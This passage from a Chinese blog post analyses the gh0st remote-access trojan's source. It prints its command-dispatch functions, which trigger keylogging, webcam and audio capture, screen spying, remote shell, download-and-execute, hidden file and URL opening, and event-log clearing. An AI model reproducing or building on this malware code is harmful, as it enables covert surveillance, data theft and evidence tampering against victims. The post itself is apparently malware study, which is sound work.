<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CKernelManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_ACTIVED:</span><br><span class="line">                <span class="built_in">InterlockedExchange</span>((LONG *)&amp;m_bIsActived, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_LIST_DRIVE: <span class="comment">// 文件管理</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_FileManager, </span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SCREEN_SPY: <span class="comment">// 屏幕查看</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_WEBCAM: <span class="comment">// 摄像头</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_VideoManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_AUDIO: <span class="comment">// 摄像头</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_AudioManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SHELL: <span class="comment">// 远程sehll</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_ShellManager, </span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_KEYBOARD: </span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SYSTEM: </span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_SystemManager,</span><br><span class="line">                    (LPVOID)m_pClient-&gt;m_Socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> COMMAND_DOWN_EXEC: <span class="comment">// 下载者</span></span><br><span class="line">                m_hThread[m_nThreadCount++] = <span class="built_in">MyCreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Loop_DownManager,</span><br><span class="line">                    (LPVOID)(lpBuffer + <span class="number">1</span>), <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">                <span class="built_in">Sleep</span>(<span class="number">100</span>); <span class="comment">// 传递参数用</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_OPEN_URL_SHOW: <span class="comment">// 显示打开网页</span></span><br><span class="line">                <span class="built_in">OpenURL</span>((LPCTSTR)(lpBuffer + <span class="number">1</span>), SW_SHOWNORMAL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_OPEN_URL_HIDE: <span class="comment">// 隐藏打开网页</span></span><br><span class="line">                <span class="built_in">OpenURL</span>((LPCTSTR)(lpBuffer + <span class="number">1</span>), SW_HIDE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_REMOVE: <span class="comment">// 卸载,</span></span><br><span class="line">                <span class="built_in">UnInstallService</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_CLEAN_EVENT: <span class="comment">// 清除日志</span></span><br><span class="line">                <span class="built_in">CleanEvent</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_SESSION:</span><br><span class="line">                CSystemManager::<span class="built_in">ShutdownWindows</span>(lpBuffer[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_RENAME_REMARK: <span class="comment">// 改备注</span></span><br><span class="line">                <span class="built_in">SetHostID</span>(m_strServiceName, (LPCTSTR)(lpBuffer + <span class="number">1</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_UPDATE_SERVER: <span class="comment">// 更新服务端</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">UpdateServer</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>))</span><br><span class="line">                    <span class="built_in">UnInstallService</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMMAND_REPLAY_HEARTBEAT: <span class="comment">// 回复心跳包</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="k85PT">FileManager</h5>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CFileManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_LIST_FILES:<span class="comment">// 获取文件列表</span></span><br><span class="line">		<span class="built_in">SendFilesList</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_DELETE_FILE:<span class="comment">// 删除文件</span></span><br><span class="line">		<span class="built_in">DeleteFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">SendToken</span>(TOKEN_DELETE_FINISH);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_DELETE_DIRECTORY:<span class="comment">// 删除文件</span></span><br><span class="line">		<span class="comment">////printf(&quot;删除目录 %s\n&quot;, (char *)(bPacket + 1));</span></span><br><span class="line">		<span class="built_in">DeleteDirectory</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">SendToken</span>(TOKEN_DELETE_FINISH);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_DOWN_FILES: <span class="comment">// 上传文件</span></span><br><span class="line">		<span class="built_in">UploadToRemote</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_CONTINUE: <span class="comment">// 上传文件</span></span><br><span class="line">		<span class="built_in">SendFileData</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_CREATE_FOLDER:</span><br><span class="line">		<span class="built_in">CreateFolder</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_RENAME_FILE:</span><br><span class="line">		<span class="built_in">Rename</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_STOP:</span><br><span class="line">		<span class="built_in">StopTransfer</span>();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_SET_TRANSFER_MODE:</span><br><span class="line">		<span class="built_in">SetTransferMode</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_FILE_SIZE:</span><br><span class="line">		<span class="built_in">CreateLocalRecvFile</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_FILE_DATA:</span><br><span class="line">		<span class="built_in">WriteLocalRecvFile</span>(lpBuffer + <span class="number">1</span>, nSize <span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_OPEN_FILE_SHOW:</span><br><span class="line">		<span class="built_in">OpenFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, SW_SHOW);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COMMAND_OPEN_FILE_HIDE:</span><br><span class="line">		<span class="built_in">OpenFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, SW_HIDE);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里的收到的包基本都是路径 进行的操作其实也就是找到路径对应的管理 然后进行操作就成</p>
<h5 id="egIuX">ScreenManager</h5>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CScreenManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_NEXT:</span><br><span class="line">                        <span class="comment">// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回</span></span><br><span class="line">                        <span class="built_in">NotifyDialogIsOpen</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_RESET:</span><br><span class="line">                        <span class="comment">//重启屏幕捕获子系统</span></span><br><span class="line">                        <span class="built_in">ResetScreen</span>(*(LPBYTE)&amp;lpBuffer[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_ALGORITHM_RESET:</span><br><span class="line">                        <span class="comment">//设置屏幕捕获的算法</span></span><br><span class="line">                        m_bAlgorithm = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        m_pScreenSpy-&gt;<span class="built_in">setAlgorithm</span>(m_bAlgorithm);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CTRL_ALT_DEL:</span><br><span class="line">                        <span class="comment">//Ctrl+Alt+Del</span></span><br><span class="line">                        ::<span class="built_in">SimulateCtrlAltDel</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CONTROL:</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// 远程仍然可以操作</span></span><br><span class="line">                            <span class="built_in">BlockInput</span>(<span class="literal">false</span>);</span><br><span class="line">                            <span class="built_in">ProcessCommand</span>(lpBuffer + <span class="number">1</span>, nSize - <span class="number">1</span>);<span class="comment">//挪动鼠标</span></span><br><span class="line">                            <span class="built_in">BlockInput</span>(m_bIsBlockInput);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_BLOCK_INPUT: <span class="comment">//ControlThread里锁定</span></span><br><span class="line">                        m_bIsBlockInput = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_BLANK:</span><br><span class="line">                        m_bIsBlankScreen = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CAPTURE_LAYER:</span><br><span class="line">                        m_bIsCaptureLayer = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        m_pScreenSpy-&gt;<span class="built_in">setCaptureLayer</span>(m_bIsCaptureLayer);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_GET_CLIPBOARD:</span><br><span class="line">                        <span class="built_in">SendLocalClipboard</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_SET_CLIPBOARD:</span><br><span class="line">                        <span class="built_in">UpdateLocalClipboard</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, nSize - <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="built_in">catch</span>(...)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>l1pmoluy,1392181761@qq.com</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://l1pmoluy.github.io/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="gh0st源码分析">https://l1pmoluy.github.io/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/04/30/WindowsStudy03-%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/" rel="next" title="WindowsStudy03-进程线程"><span class="post-nav-text">WindowsStudy03-进程线程</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2025 </span><a class="with-love" id="animate" href="https://l1pmoluy.github.io" title="l1pmoluy's blog"><span class="icon iconify" data-icon="ri:cloud-line"></span></a><span class="author"> l1pmoluy</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#f5b8d5" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div></body></html>